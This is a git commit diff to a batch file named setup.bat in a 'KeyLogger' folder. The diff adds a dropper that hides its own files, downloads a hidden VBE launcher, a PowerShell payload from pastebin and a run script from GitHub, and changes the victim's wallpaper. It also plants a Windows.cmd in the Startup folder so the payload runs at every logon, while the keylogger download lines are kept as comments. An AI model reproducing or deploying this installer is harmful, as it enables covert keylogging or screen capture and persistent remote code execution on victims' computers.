1fec1b4a58a39f78afe95995a65e03f367721d42
Ale-cyber <59205495+Ale-cyber@users.noreply.github.com>
2021-11-07 12:49:49 +0100

    Update setup.bat

--- KeyLogger/setup.bat
+++ KeyLogger/setup.bat
@@ -7,7 +7,19 @@ if not exist t\ (
 attrib +s +h t
 attrib +s +h s.bat
 cd t
-curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/invisible.vbe -o i.vbe
-curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/keylogger.ps1 -o p.ps1
-curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/run.bat -o r.bat
+
+curl -s https://everythingisviral.com/wp-content/uploads/2021/01/gigachad-meme.png -o background.png
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  %temp%/t/background.png /f
+curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/invisible.vbe -o i.vbe
+curl -s https://pastebin.com/raw/dsLQmyew -o s.ps1
+curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/run.bat -o r.bat
+
+cd "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup"
+echo @echo off>Windows.cmd
+echo cd %temp%/t>>Windows.cmd
+echo wscript.exe "i.vbe" "r.bat">>Windows.cmd
+
+:: curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/invisible.vbe -o i.vbe
+:: curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/keylogger.ps1 -o p.ps1
+:: curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/run.bat -o r.bat
 wscript.exe "i.vbe" "r.bat"
